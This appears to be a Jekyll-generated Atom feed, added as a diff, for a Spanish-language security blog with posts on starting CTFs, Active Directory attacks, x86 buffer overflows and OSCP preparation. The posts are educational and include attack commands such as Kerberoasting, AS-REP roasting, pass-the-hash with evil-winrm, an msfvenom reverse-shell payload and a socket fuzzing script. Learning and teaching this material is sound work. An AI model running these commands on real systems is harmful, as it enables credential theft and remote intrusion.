@@ -1,0 +1,139 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-03-19T02:38:40-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sexcott</title><subtitle>Security researcher. CTF player. Documenting the journey.</subtitle><author><name>sexcott</name><email></email></author><entry><title type="html">Cómo empezar en CTFs: mi ruta de aprendizaje</title><link href="http://localhost:4000/blog/2024/04/01/como-empezar-en-ctfs/" rel="alternate" type="text/html" title="Cómo empezar en CTFs: mi ruta de aprendizaje" /><published>2024-04-01T00:00:00-07:00</published><updated>2024-04-01T00:00:00-07:00</updated><id>http://localhost:4000/blog/2024/04/01/como-empezar-en-ctfs</id><content type="html" xml:base="http://localhost:4000/blog/2024/04/01/como-empezar-en-ctfs/"><![CDATA[<p>Si estás leyendo esto probablemente te haces la misma pregunta que yo me hice hace tiempo: <strong>¿por dónde empiezo?</strong></p>
+
+<h2 id="plataformas-recomendadas">Plataformas recomendadas</h2>
+
+<p>Las que más me han servido:</p>
+
+<ul>
+  <li><strong>TryHackMe</strong> — Ideal para principiantes. Tiene rutas guiadas y máquinas muy bien explicadas.</li>
+  <li><strong>HackTheBox</strong> — Más desafiante. Para cuando ya tienes algo de base.</li>
+  <li><strong>PicoCTF</strong> — Excelente para challenges de crypto, web y reversing.</li>
+</ul>
+
+<h2 id="la-mentalidad-correcta">La mentalidad correcta</h2>
+
+<p>El error más común es querer saltar directo a máquinas difíciles. Mi consejo:</p>
+
+<blockquote>
+  <p>No pasa nada por leer writeups. Lo importante es entender <em>por qué</em> funciona cada técnica, no solo copiar comandos.</p>
+</blockquote>
+
+<h2 id="recursos-que-uso-constantemente">Recursos que uso constantemente</h2>
+
+<ol>
+  <li><a href="https://book.hacktricks.xyz">HackTricks</a> — La biblia del pentesting</li>
+  <li><a href="https://gtfobins.github.io">GTFOBins</a> — Para escalada de privilegios en Linux</li>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li>
+</ol>
+
+<hr />
+
+<p><em>¿Tienes dudas o quieres que profundice en algún tema? Escríbeme en GitHub.</em></p>]]></content><author><name>sexcott</name></author><category term="ctf" /><category term="aprendizaje" /><category term="recursos" /><summary type="html"><![CDATA[Recursos, plataformas y consejos que me hubiera gustado tener al empezar.]]></summary></entry><entry><title type="html">Active Directory 101: enumeración y ataques comunes</title><link href="http://localhost:4000/blog/2024/03/22/active-directory-101/" rel="alternate" type="text/html" title="Active Directory 101: enumeración y ataques comunes" /><published>2024-03-22T00:00:00-07:00</published><updated>2024-03-22T00:00:00-07:00</updated><id>http://localhost:4000/blog/2024/03/22/active-directory-101</id><content type="html" xml:base="http://localhost:4000/blog/2024/03/22/active-directory-101/"><![CDATA[<p>Active Directory aparece en prácticamente todos los entornos corporativos reales. Entenderlo es indispensable.</p>
+
+<h2 id="enumeración-inicial">Enumeración inicial</h2>
+
+<p>Con credenciales válidas podemos usar <strong>BloodHound</strong> para mapear el dominio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound-python <span class="nt">-u</span> usuario <span class="nt">-p</span> password <span class="nt">-d</span> dominio.local <span class="nt">-ns</span> IP_DC
+</code></pre></div></div>
+
+<h2 id="ataques-comunes">Ataques comunes</h2>
+
+<h3 id="kerberoasting">Kerberoasting</h3>
+
+<p>Solicitar tickets TGS para cuentas con SPN y crackearlos offline:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs dominio.local/usuario:password <span class="nt">-dc-ip</span> IP <span class="nt">-request</span>
+hashcat <span class="nt">-m</span> 13100 hashes.txt rockyou.txt
+</code></pre></div></div>
+
+<h3 id="pass-the-hash">Pass-the-Hash</h3>
+
+<p>Si tenemos el hash NTLM de un administrador local:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> IP <span class="nt">-u</span> Administrator <span class="nt">-H</span> NTLM_HASH
+</code></pre></div></div>
+
+<h3 id="as-rep-roasting">AS-REP Roasting</h3>
+
+<p>Para cuentas sin pre-autenticación Kerberos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers dominio.local/ <span class="nt">-usersfile</span> users.txt <span class="nt">-dc-ip</span> IP
+</code></pre></div></div>
+
+<hr />
+
+<blockquote>
+  <p>AD es un mundo enorme. Esta guía es solo la superficie — cada ataque tiene sus variantes y contramedidas.</p>
+</blockquote>]]></content><author><name>sexcott</name></author><category term="Técnico" /><summary type="html"><![CDATA[Kerberoasting, Pass-the-Hash, BloodHound... guía de referencia para labs y máquinas de AD.]]></summary></entry><entry><title type="html">Buffer Overflow en x86: desde cero hasta shellcode</title><link href="http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero/" rel="alternate" type="text/html" title="Buffer Overflow en x86: desde cero hasta shellcode" /><published>2024-02-08T00:00:00-07:00</published><updated>2024-02-08T00:00:00-07:00</updated><id>http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero</id><content type="html" xml:base="http://localhost:4000/blog/2024/02/08/buffer-overflow-desde-cero/"><![CDATA[<p>El Buffer Overflow es uno de esos conceptos que suena intimidante hasta que lo ves en acción. Vamos paso a paso.</p>
+
+<h2 id="qué-es-un-buffer-overflow">¿Qué es un Buffer Overflow?</h2>
+
+<p>Cuando un programa copia datos en un buffer sin verificar su tamaño, puede sobrescribir regiones de memoria adyacentes — incluyendo la dirección de retorno de una función.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Stack frame:
+[ buffer (100 bytes) ][ EBP ][ EIP ] &lt;-- lo que queremos controlar
+</code></pre></div></div>
+
+<h2 id="proceso-completo">Proceso completo</h2>
+
+<h3 id="1-fuzzing--encontrar-el-crash">1. Fuzzing — encontrar el crash</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+</code></pre></div></div>
+
+<h3 id="2-controlar-eip">2. Controlar EIP</h3>
+
+<p>Con <code class="language-plaintext highlighter-rouge">pattern_create</code> y <code class="language-plaintext highlighter-rouge">pattern_offset</code> de Metasploit encontramos el offset exacto.</p>
+
+<h3 id="3-bad-chars">3. Bad chars</h3>
+
+<p>Enviamos todos los bytes del <code class="language-plaintext highlighter-rouge">\x00</code> al <code class="language-plaintext highlighter-rouge">\xff</code> y observamos cuáles corrompen el payload.</p>
+
+<h3 id="4-shellcode">4. Shellcode</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> python
+</code></pre></div></div>
+
+<hr />
+
+<p>En el próximo post veremos cómo aplicar esto en un entorno real con una máquina de HTB.</p>]]></content><author><name>sexcott</name></author><category term="Técnico" /><summary type="html"><![CDATA[Explicación práctica con ejemplos en 32-bit, debugging con GDB y técnicas básicas de explotación.]]></summary></entry><entry><title type="html">Mi experiencia preparando el OSCP: lo que nadie te dice</title><link href="http://localhost:4000/blog/2024/01/15/preparando-oscp/" rel="alternate" type="text/html" title="Mi experiencia preparando el OSCP: lo que nadie te dice" /><published>2024-01-15T00:00:00-07:00</published><updated>2024-01-15T00:00:00-07:00</updated><id>http://localhost:4000/blog/2024/01/15/preparando-oscp</id><content type="html" xml:base="http://localhost:4000/blog/2024/01/15/preparando-oscp/"><![CDATA[<p>Llevar meses preparándote para un examen de 24 horas tiene algo de absurdo y algo de adictivo. Aquí te cuento cómo está yendo mi proceso.</p>
+
+<h2 id="por-qué-el-oscp">Por qué el OSCP</h2>
+
+<p>Después de varios meses en TryHackMe y HackTheBox, sentí que necesitaba una meta concreta. El OSCP tiene la reputación de ser <em>el</em> examen que te obliga a pensar por ti mismo, sin muletas.</p>
+
+<h2 id="lo-que-más-me-está-costando">Lo que más me está costando</h2>
+
+<p>El <strong>Buffer Overflow</strong> en x86 fue mi primer gran muro. Pasar de entender el concepto a ejecutarlo sin guía en un examen es otra historia.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Esqueleto básico para fuzzing
+</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span>
+
+<span class="n">ip</span>   <span class="o">=</span> <span class="s">"192.168.x.x"</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">buf</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Crash con </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="recursos-que-recomiendo">Recursos que recomiendo</h2>
+
+<ol>
+  <li><strong>TCM Security — Practical Ethical Hacking</strong>: el mejor curso de preparación en precio/calidad.</li>
+  <li><strong>TryHackMe Buffer Overflow Prep</strong>: room perfecta para practicar el proceso completo.</li>
+  <li><strong>HTB máquinas retiradas</strong>: empieza por las Easy de Linux antes de pasar a Windows y Active Directory.</li>
+</ol>
+
+<hr />
+
+<p>Si estás en el mismo camino, no dudes en contactarme. La comunidad lo es todo.</p>]]></content><author><name>sexcott</name></author><category term="Certificaciones" /><summary type="html"><![CDATA[Un recorrido honesto por el proceso de estudio, los recursos que usé y los errores que cometí en el camino.]]></summary></entry></feed>
